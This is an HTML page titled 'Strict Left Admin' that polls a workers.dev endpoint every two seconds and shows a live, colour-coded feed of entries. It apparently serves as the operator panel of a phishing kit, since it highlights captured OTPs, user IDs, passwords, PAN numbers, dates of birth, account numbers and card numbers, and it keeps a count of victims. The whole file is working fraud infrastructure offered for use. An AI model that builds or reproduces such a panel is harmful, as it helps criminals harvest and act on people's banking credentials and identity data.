<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Strict Left Admin</title>
    <style>
        /* CSS reset to force extreme left */
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Arial', sans-serif;
        }
        
        body { 
            background-color: #ffffff; 
            padding: 5px;
            text-align: left !important;
        }

        .header {
            width: 100%;
            padding: 5px 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            margin-bottom: 5px;
        }
        
        .v-badge {
            background: #000;
            color: #fff;
            padding: 2px 8px;
            border-radius: 3px;
            font-weight: 900;
            font-size: 14px;
        }

        /* Logs Container */
        #logsDisplay { 
            width: 100%; 
            border-spacing: 0 4px; /* Boxes ke beech ka gap */
            border-collapse: separate;
        }

        /* Table Row as a Cart */
        .log-row {
            width: 100%;
            border-radius: 4px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 800;
            line-height: 1.4;
        }

        .log-cell {
            padding: 6px 12px; /* Patla cart */
            text-align: left !important; /* Force extreme left */
            vertical-align: top;
            word-break: break-all;
            white-space: pre-wrap;
            border-radius: 4px;
        }

        .time-text {
            display: block;
            font-size: 9px;
            color: rgba(255,255,255,0.7);
            margin-top: 3px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1 style="font-size: 12px; color:#888;">LIVE FEED</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <table id="logsDisplay">
        </table>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#333"; 

                    // VIBRANT COLORS
                    if (content.includes("otp:-")) {
                        bgColor = "#FF0000"; // Pure Red
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#008000"; // Sharp Green
                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
                        bgColor = "#0000FF"; // Pure Blue
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#FF00FF"; // Hot Pink
                    } else if (content.includes("card:-")) {
                        bgColor = "#FF8C00"; // Dark Orange
                    }

                    return `
                        <tr class="log-row">
                            <td class="log-cell" style="background-color: ${bgColor};">
                                ${log.detail}
                                <span class="time-text">${log.time || ''}</span>
                            </td>
                        </tr>
                    `;
                }).join('');

            } catch (e) { console.log("Sync..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
